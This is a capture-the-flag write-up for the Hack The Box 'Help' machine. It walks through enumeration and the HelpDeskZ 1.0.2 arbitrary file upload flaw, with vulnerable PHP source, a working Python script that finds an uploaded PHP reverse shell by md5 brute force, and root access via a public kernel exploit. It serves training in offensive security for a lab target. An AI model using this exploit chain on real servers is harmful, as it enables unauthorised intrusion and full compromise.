# Help - hack the box 

![EFe80A.png](https://s2.ax1x.com/2019/04/21/EFe80A.png)

## Introduction

Target: 10.10.10.121(Linux)

Kali: 10.10.16.28

To be honest, Help is not a difficult box. But there are some rabbit holes in the box. And in some case you may come across a very strange situation. May you should step back, find is there something wrong. For the priesc of root, never give up trying the most basic method.

## Infomation Enumeration

Firstly, gather open ports and services:

```
# Nmap 7.70 scan initiated Sat Apr 20 02:13:56 2019 as: nmap -sC -sV -oA services 10.10.10.121
Nmap scan report for 10.10.10.121
Host is up (1.2s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr 20 02:14:40 2019 -- 1 IP address (1 host up) scanned in 43.61 seconds
```

The port 80 seems to be a http service. Aceess to `http://10.10.10.121`, nothing special but just the apache default web page. Try gobuster:

```
gobuster -u http://10.10.10.121 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.tx -t 50
```

We have found a folder called: `support`:

![EFeHtx.png](https://s2.ax1x.com/2019/04/21/EFeHtx.png)

The 80 seems to be help support website. We will find more later.

For the `3000` port, it seems to be a express application. And nothing found for this.

![EFeXcD.png](https://s2.ax1x.com/2019/04/21/EFeXcD.png)

## Exploitation

### http

In the above, we can see `HelpDeskZ` in the web page. It may be a knid of product. Search related exploits, `searchsploit HelpDeskZ`.

![EF0rkt.png](https://s2.ax1x.com/2019/04/21/EF0rkt.png)

There two exploits about `HelpDeskZ`. `Arbitrary File Upload` is interesting, it seems that it can be exploited with valid credentials. The payload can be seen [here](https://www.exploit-db.com/exploits/40300). It's really significant to understand the root cause of the exploit. So know the details of the payload will be benificial.

The step of exploitation is:

1. Access to `http://10.10.10.121/support/?v=submit_ticket&action=displayForm`
2. Fill out all the fields in the web page, and sumit the ticket.
3. Then run the script to exploit.

The script can be exploited, but should take case of some case. I have learned an import lesseon from this box: if you stuck in some case for a long time and has not obtained the expected result. You should step back and see if there is anything wrong.

The reason of the exploit is: when submit a ticket, the attachment will be uploaded. And the uploaded file will be named as `md5(filename+filename_time)`. The source code is as [following](https://github.com/evolutionscript/HelpDeskZ-1.0/blob/006662bb856e126a38f2bb76df44a2e4e3d37350/controllers/submit_ticket_controller.php#L140):

```php
if(!isset($error_msg) && $settings['ticket_attachment']==1){
	$uploaddir = UPLOAD_DIR.'tickets/';		
	if($_FILES['attachment']['error'] == 0){
		$ext = pathinfo($_FILES['attachment']['name'], PATHINFO_EXTENSION);
		$filename = md5($_FILES['attachment']['name'].time()).".".$ext;
		$fileuploaded[] = array('name' => $_FILES['attachment']['name'], 'enc' => $filename, 'size' => formatBytes($_FILES['attachment']['size']), 'filetype' => $_FILES['attachment']['type']);
		$uploadedfile = $uploaddir.$filename;
		if (!move_uploaded_file($_FILES['attachment']['tmp_name'], $uploadedfile)) {
			$show_step2 = true;
			$error_msg = $LANG['ERROR_UPLOADING_A_FILE'];
		}else{
			$fileverification = verifyAttachment($_FILES['attachment']);
			switch($fileverification['msg_code']){
				case '1':
				$show_step2 = true;
				$error_msg = $LANG['INVALID_FILE_EXTENSION'];
				break;
				case '2':
				$show_step2 = true;
				$error_msg = $LANG['FILE_NOT_ALLOWED'];
				break;
				case '3':
				$show_step2 = true;
				$error_msg = str_replace('%size%',$fileverification['msg_extra'],$LANG['FILE_IS_BIG']);
				break;
			}
		}
}	
```

The most important code: `$filename = md5($_FILES['attachment']['name'].time()).".".$ext;`. We can found the rule of the name of the uploaded file. So it will be possile to find the uploaded attachment. And there is another stuff, when submited a reverse shell php file, you will get a hint: `File is not allowed`. However, the attachment has been uploaded. Because it will upload the attachment firstly. And then just give the error information.

![EFrlwj.png](https://s2.ax1x.com/2019/04/21/EFrlwj.png)

```php
if (!move_uploaded_file($_FILES['attachment']['tmp_name'], $uploadedfile)) {
	$show_step2 = true;
	$error_msg = $LANG['ERROR_UPLOADING_A_FILE'];
}else{
	$fileverification = verifyAttachment($_FILES['attachment']);
	switch($fileverification['msg_code']){
		case '1':
		$show_step2 = true;
		$error_msg = $LANG['INVALID_FILE_EXTENSION'];
```

Firstly, submit a ticket with the attachment of `php-reverse-shell.php` and will get error information `File is not allowed`. However, the script has been uploaded actually. 

![EFhf2j.png](https://s2.ax1x.com/2019/04/21/EFhf2j.png)

Then, try to run the script:

```
python exploit.py http://10.10.10.121/support/ a.php
```

In order to decrease the complexity of the md5 hash, the `php-reverse-shell.php` is renamed to `a.php`. However, there are two prblems so that I obtain nothing for the whole afternoon. The first problem is timezone. The uploaded filename depends on the file time. So it is impotant to keep the same timezone for the local machine and the server. We can find that the server timezone is GMT from the response header of Date. So modify the timezone of local machine:

```bash
timedatectl set-timezone GMT
```

After modify the timezone, still have not found anthing. It has some problem with the url. Read the source code and you will find the upload directory should be: `UPLOAD_DIR.'tickets/`:

![EFhSUS.png](https://s2.ax1x.com/2019/04/21/EFhSUS.png)

Hence, the url should be `http://10.10.10.121/support/uploads/tickets/`. So run the script:

`python exploit.py http://10.10.10.121/support/uploads/tickets/ a.php`

I have modified the scritp slightly for my own purpose.

```python
import hashlib
import time
import sys
import requests
print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) < 3:
    print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]

currentTime = int(time.time())

for x in range(0, 1500):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+md5hash+'.php'
    print "This is the " + str(x) + " time:"
    response = requests.head(url)
    if response.status_code == 200:
        print "found!"
        print url
        sys.exit(0)
    else:
        print "has tried " + url + ":" + str(response.status_code)

print "Sorry, I did not find anything"
```

Remember to set nc listen to port in the begining. After some time, the shell is returned.

![EFhlvR.png](https://s2.ax1x.com/2019/04/21/EFhlvR.png)

## Priv Esc

In contrast to the user shell, the root shell is extremely simple. But the basic method might be overlooked sometimes. Obtain root shell by kernel exploit is uncommon recently. But it never be insignificant to have a try. Obtain the kernel of the linux by `uname a`:

`Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux`

Google for `linux kernel 4.4.0--116`. Congratulations! Find the [payload](https://github.com/SecWiki/linux-kernel-exploits/tree/master/2017/CVE-2017-16995). Just download the payload and compile. After execution, the root shell is obtained.

![EF4Ezd.png](https://s2.ax1x.com/2019/04/21/EF4Ezd.png)



